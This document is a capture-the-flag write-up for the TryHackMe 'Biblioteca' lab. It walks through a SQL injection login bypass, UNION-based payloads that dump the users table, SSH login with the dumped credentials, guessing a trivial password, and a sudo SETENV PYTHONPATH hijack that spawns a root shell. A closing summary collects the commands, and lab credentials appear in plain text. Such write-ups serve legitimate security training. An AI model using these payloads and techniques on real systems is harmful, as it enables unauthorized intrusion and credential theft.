# Biblioteca - TryHackMe

> **Kill Chain Summary**: Exploit a SQL injection vulnerability in the login portal of a Python Werkzeug web application to bypass authentication and execute a UNION-based attack that extracts administrative credentials (`smokey:My_P@ssW0rd123`) from the `users` table. Reuse these credentials to obtain SSH access as `smokey`, perform lateral movement to local user `hazel` by testing default credentials (`hazel:hazel`), and leverage `sudo` permissions with the `SETENV` directive on a Python script (`hasher.py`). Finally, hijack the imported `hashlib` library by placing a malicious Python script in `/tmp` and executing the binary with a modified `PYTHONPATH` to gain root access.

| Property | Value |
| --- | --- |
| **Target Name** | Biblioteca |
| **Platform** | TryHackMe |
| **OS** | Linux (Ubuntu) |
| **Difficulty** | Medium |
| **Status** | Rooted |
| **Key Techniques** | Authentication Bypass via SQLi, UNION-Based SQL Injection, Database Enumeration (information_schema), Credential Reuse, Password Guessing, Sudo SETENV Abuse, Python Library Hijacking (PYTHONPATH) |

---

## 1. Reconnaissance and Enumeration

### TCP Port Scanning

A full TCP port scan was executed to identify open network services:

```bash
sudo nmap -sC -sV -p- -T4 -oA nmap/full_tcp_$IP $IP
```

**Port Scan Results:**

| Port | Service | Version / Details | Operational Role |
| --- | --- | --- | --- |
| **22/tcp** | ssh | OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux) | Secure Remote Shell |
| **8000/tcp** | http | Werkzeug httpd 2.0.2 (Python 3.8.10) | Biblioteca Web Application |

### Web Application Enumeration (Port 8000)

Visiting `http://$IP:8000` revealed a web application interface featuring user registration and authentication workflows.

Testing the authentication form with standard SQL injection control characters demonstrated vulnerability to authentication bypass:

```text
Username: ' OR 1=1-- -
Password: anypassword
```

Submitting the payload successfully bypassed authentication, granting access to the authenticated user portal and confirming SQL injection in the underlying query.

---

## 2. Initial Access

### Manual UNION-Based SQL Injection

Rather than relying purely on automated scanners, a structured manual UNION-based SQL injection attack was conducted to extract the database schema and sensitive records.

#### 1. Column Count Determination

Testing column counts using `ORDER BY` and `UNION SELECT`:

```sql
' ORDER BY 5-- -
-- Returned a database error, indicating fewer than 5 columns.

' UNION SELECT 1,2,3,4-- -
-- Succeeded, displaying the number "2" in the rendered output.
```

The injection point expects **4 columns**, and the **second column** is directly reflected in the web application output.

#### 2. Current Database Identification

```sql
' UNION SELECT 1,database(),3,4-- -
```

Reflected Database Name: `website`

#### 3. Table Enumeration

Querying `information_schema.tables` for tables belonging to the `website` database:

```sql
' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- -
```

Reflected Table: `users`

#### 4. Column Enumeration

Querying `information_schema.columns` for columns within the `users` table:

```sql
' UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='users'-- -
```

Reflected Columns: `email, id, password, username`

#### 5. Data Extraction

Extracting username and password pairs separated by a colon (`0x3a` in hex):

```sql
' UNION SELECT 1,group_concat(username, 0x3a, password),3,4 FROM users-- -
```

Extracted Credentials:
```text
smokey:My_P@ssW0rd123
```

### SSH Initial Access

Testing the dumped credentials against the OpenSSH service on port 22:

```bash
ssh smokey@$IP
```

Authentication succeeded, establishing a shell as user `smokey`:

```bash
smokey@biblioteca:~$ id
uid=1000(smokey) gid=1000(smokey) groups=1000(smokey)
```

---

## 3. Privilege Escalation

### Lateral Movement to User hazel

Inspecting the `/home` directory revealed two interactive users: `smokey` and `hazel`.

Reviewing the web application source code located at `/var/opt/app/app.py` revealed internal database credentials (`smokey` and `$tr0nG_P@sS!`), but these did not grant access to the `hazel` account.

Before deploying extensive dictionary attacks, basic credential spraying and username/password reuse were evaluated:

```bash
su hazel
# Password: hazel
```

The account was secured with the trivial password `hazel`, immediately granting lateral access:

```bash
hazel@biblioteca:~$ id
uid=1001(hazel) gid=1001(hazel) groups=1001(hazel)
```

The user flag was retrieved:

```bash
cat /home/hazel/user.txt
[FLAG REDACTED]
```

### Privilege Escalation via Sudo SETENV and Python Library Hijacking

Auditing the sudo privileges assigned to `hazel`:

```bash
sudo -l
```

Output:
```text
Matching Defaults entries for hazel on biblioteca:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hazel may run the following commands on biblioteca:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /home/hazel/hasher.py
```

#### Vulnerability Analysis

Two critical conditions exist:
1. **The `SETENV` Tag**: Sudo preserves user-defined environment variables passed on the command line during execution, overriding the default behavior of `env_reset`.
2. **Script Import Dependency**: The target script `/home/hazel/hasher.py` is owned by `root`, but reading its contents reveals that it imports the standard Python library `hashlib`:

```python
import hashlib
# ...
```

In Python, the module search path priority checks directories defined in the `PYTHONPATH` environment variable before querying the standard library directories. By manipulating `PYTHONPATH` under `SETENV`, Python can be directed to load an arbitrary module created by the attacker.

#### Exploitation

A rogue module named `hashlib.py` was created in `/tmp`:

```bash
cat << 'EOF' > /tmp/hashlib.py
import os
os.system('/bin/bash -p')
EOF
```

The target command was executed with `PYTHONPATH` set to `/tmp`:

```bash
sudo PYTHONPATH=/tmp /usr/bin/python3 /home/hazel/hasher.py
```

When Python initialized and executed `import hashlib`, it imported and executed `/tmp/hashlib.py` with root authority, immediately dropping into a root shell:

```bash
root@biblioteca:~# id
uid=0(root) gid=0(root) groups=0(root)
```

The root flag was retrieved:

```bash
cat /root/root.txt
[FLAG REDACTED]
```

---

## 4. Useful Commands Summary

```bash
# Manual UNION SQLi Column Number Detection
' ORDER BY 1-- -
' ORDER BY 5-- -

# Manual UNION SQLi Schema Enumeration
' UNION SELECT 1,database(),3,4-- -
' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1,group_concat(username, 0x3a, password),3,4 FROM users-- -

# Sudo Permissions Audit
sudo -l

# Exploiting Sudo SETENV with PYTHONPATH Hijacking
cat << 'EOF' > /tmp/hashlib.py
import os
os.system('/bin/bash -p')
EOF

sudo PYTHONPATH=/tmp /usr/bin/python3 /home/hazel/hasher.py
```

---

## 5. Key Takeaways and Lessons Learned

1. **Systematic Manual SQL Injection Methodology**:
   Manual UNION-based SQL injection follows an invariant operational sequence: determine column count with `ORDER BY`, identify reflection points with `UNION SELECT 1,2,3...`, query the database name, map tables and columns via `information_schema`, and dump credentials. Understanding this underlying logic ensures reliable exploitation in environments where automated tools are blocked or restricted.

2. **Always Test Default and Trivial Passwords First**:
   Before launching resource-intensive password brute-forcing utilities (like Hydra or John the Ripper), always test default password patterns: `username:username`, `username:password`, `username:admin`, and `username:123456`. Trivial credential hygiene accounts for a significant percentage of lateral movement opportunities.

3. **Sudo Directive Significance (`SETENV`)**:
   Standard sudo configurations employ `env_reset` to prevent attackers from manipulating environment variables such as `PATH`, `LD_PRELOAD`, or `PYTHONPATH`. When `SETENV` is explicitly permitted, any script relying on external binaries or dynamically loaded language modules can be hijacked.

4. **Python Library Hijacking vs PATH Hijacking**:
   - When a privileged script invokes a system command without an absolute path (e.g., `os.system("ls")`), exploit it via **PATH Hijacking**.
   - When a privileged Python script imports a module (e.g., `import hashlib`), exploit it via **Python Library Hijacking** using `PYTHONPATH` or directory placement precedence.

---

#thm #linux #ubuntu #sqli #union-sqli #manual-sqli #information-schema #weak-credentials #credential-reuse #sudo #setenv #python-library-hijacking #pythonpath #medium
